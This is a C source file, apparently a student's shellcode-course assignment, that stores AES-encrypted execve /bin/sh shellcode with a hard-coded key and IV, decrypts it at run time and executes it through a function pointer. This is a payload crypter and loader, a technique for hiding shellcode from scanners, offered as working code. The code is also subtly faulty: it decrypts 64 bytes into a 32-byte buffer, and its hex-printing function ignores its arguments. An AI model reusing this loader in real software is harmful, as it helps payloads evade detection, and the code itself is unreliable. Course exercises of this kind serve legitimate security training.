// Student ID     : SLAE-1250
// Student Name   : Jonathan "Chops" Crosby
// Assignment 7   : Custom Decrypter
// File Name      : decrypter.c
// Derived From   : https://github.com/kokke/tiny-AES-c

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"

//encrypted shellcode for execve for /bin/sh
uint8_t shellcode[] =  { 0x90, 0x60, 0x90, 0x9f, 0xab, 0xbf, 0xb9, 0xea, 0x15, 0x98,
                         0x38, 0xea, 0x0b, 0xbb, 0xe6, 0x45, 0x95, 0xea, 0x24, 0xc3,
                         0x87, 0xda, 0xd2, 0x75, 0xf6, 0x20, 0x2b, 0xa4, 0xdc, 0x02,
                         0x91, 0x67 };

static void decrypt_cbc(void)
{

    //w00tw00tw00tw00tw00tw00tw00tw00t
    uint8_t key[] = { 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74 };

    //w00tw00tw00tw00t
    uint8_t iv[]  = { 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74 };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, 64);

    putchar('\n');
}

void showHex(uint8_t* shellin, size_t size)
{
    int i;
    for (i = 0; i < sizeof shellcode; i ++)
    {
        printf("\\0x%02x", shellcode[i]);
    }
}

int main(void)
{
    printf("\n\nEncrypted Shellcode:\n");
    printf("--------------------\n");
    showHex(shellcode, sizeof(shellcode)-1);

    decrypt_cbc();

    printf("\n\nDecrypted Shellcode:\n");
    printf("--------------------\n");
    showHex(shellcode, sizeof(shellcode)-1);

    printf("\n\nExecuting Shellcode Now!\n");
    printf("--------------------\n");

    int (*ret)() = (int(*)())shellcode;

    ret();

    return 0;

}
